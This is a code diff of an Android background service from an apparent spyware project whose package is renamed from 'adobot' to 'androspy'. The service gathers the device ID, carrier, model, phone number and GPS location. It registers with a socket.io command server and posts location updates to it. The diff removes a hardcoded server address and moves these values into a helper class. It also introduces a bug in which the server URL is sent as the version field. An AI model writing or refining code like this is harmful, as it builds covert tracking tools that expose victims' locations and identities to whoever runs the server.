@@ -1,10 +1,11 @@
-package buddy.ap.com.adobot;
+package buddy.ap.com.androspy;
 
 import android.Manifest;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
@@ -16,7 +17,6 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.support.v4.BuildConfig;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
@@ -40,48 +40,18 @@ public class Client extends Service {
 
     private static final String TAG = "Client";
 
-    public static String SERVER;
     private static final String POST_STATUS = "/status";
 
+    private CommonParams params;
     private Client client;
     private Socket socket;
     private boolean connected;
     private boolean registered;
-    private String uid;
-    private String device;
-    private String sdk;
-    private String provider;
-    private String phone;
-    private int version;
     private double latitude;
     private double longitude;
 
     public Socket getSocket() {
         return socket;
-    }
-
-    public String getUid() {
-        return uid;
-    }
-
-    public String getDevice() {
-        return device;
-    }
-
-    public String getSdk() {
-        return sdk;
-    }
-
-    public String getProvider() {
-        return provider;
-    }
-
-    public String getPhone() {
-        return phone;
-    }
-
-    public int getVersion() {
-        return version;
     }
 
     public double getLatitude() {
@@ -116,21 +86,9 @@ public class Client extends Service {
     @Override
     public void onCreate() {
 
-        SERVER = buddy.ap.com.adobot.BuildConfig.DEBUG ? "http://192.168.1.251:3000" : "https://obscure-escarpment-69091.herokuapp.com";
-
+        params = new CommonParams(this);
         client = this;
         connected = false;
-        uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
-        device = android.os.Build.MODEL;
-        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString(); //Build.VERSION.RELEASE;
-        version = 1;
-        phone = "";
-
-        TelephonyManager telephonyManager = ((TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
-        provider = telephonyManager.getNetworkOperatorName();
-        if (ContextCompat.checkSelfPermission(client, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
-            phone = telephonyManager.getLine1Number();
-        }
 
         latitude = 0;
         longitude = 0;
@@ -146,7 +104,7 @@ public class Client extends Service {
             }
         }
         try {
-            socket = IO.socket(SERVER);
+            socket = IO.socket(params.getServer());
             socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
 
                 @Override
@@ -156,14 +114,14 @@ public class Client extends Service {
                     connected = true;
 
                     HashMap bot = new HashMap();
-                    bot.put("uid", uid);
-                    bot.put("provider", provider);
+                    bot.put("uid", params.getUid());
+                    bot.put("provider", params.getProvider());
                     bot.put("lat", latitude);
                     bot.put("longi", longitude);
-                    bot.put("device", device);
-                    bot.put("sdk", sdk);
-                    bot.put("version", version);
-                    bot.put("phone", phone);
+                    bot.put("device", params.getDevice());
+                    bot.put("sdk", params.getSdk());
+                    bot.put("version", params.getVersion());
+                    bot.put("phone", params.getPhone());
 
                     JSONObject obj = new JSONObject(bot);
                     socket.emit("register", obj, new Ack() {
@@ -224,22 +182,6 @@ public class Client extends Service {
                 public void call(Object... args) {
                     connected = false;
                     Log.i(TAG, "\n\nSocket disconnected...\n\n");
-                    final Thread reconnect = new Thread() {
-                        @Override
-                        public void run() {
-                            super.run();
-                            try {
-                                Thread.sleep(10000);
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
-                            }
-                            Log.i(TAG, "Socket reconnecting after being disconnected..");
-
-                            if (!connected)
-                                socket.connect();
-                        }
-                    };
-                    reconnect.start();
                 }
 
             });
@@ -277,22 +219,21 @@ public class Client extends Service {
             Log.i(TAG, "Location changed ....");
 
             HashMap bot = new HashMap();
-            bot.put("uid", uid);
-            bot.put("provider", provider);
+            bot.put("uid", params.getUid());
+            bot.put("provider", params.getProvider());
             bot.put("lat", latitude);
             bot.put("longi", longitude);
-            bot.put("device", device);
-            bot.put("sdk", sdk);
-            bot.put("version", version);
-            bot.put("phone", phone);
+            bot.put("device", params.getDevice());
+            bot.put("sdk", params.getSdk());
+            bot.put("version", params.getServer());
+            bot.put("phone", params.getPhone());
             Http req = new Http();
-            req.setUrl(SERVER + POST_STATUS + "/" + uid);
+            req.setUrl(params.getServer() + POST_STATUS + "/" + params.getUid());
             req.setMethod("POST");
             req.setParams(bot);
             req.execute();
         }
     }
-
 
     public String getContactName(Context context, String phoneNumber) {
         // check permission
